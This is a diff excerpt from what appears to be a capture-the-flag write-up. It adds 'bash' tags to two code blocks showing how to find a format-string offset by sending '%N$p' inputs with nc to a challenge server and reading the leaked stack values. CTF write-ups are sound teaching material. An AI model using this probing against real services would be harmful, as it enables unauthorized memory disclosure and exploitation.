@@ -369,14 +369,14 @@ It is important to set the context to the correct arch when using the pwntools f
 
 The `offset` can be quickly found with:
 
-```
+```bash
 # echo '%1$p' | nc chall.csivit.com 30023
 0xf7f4fff0
 ```
 
 Just increment the number until the output matches the input, e.g.:
 
-```
+```bash
 # echo '%12$p' | nc chall.csivit.com 30023
 0x24323125
 ```
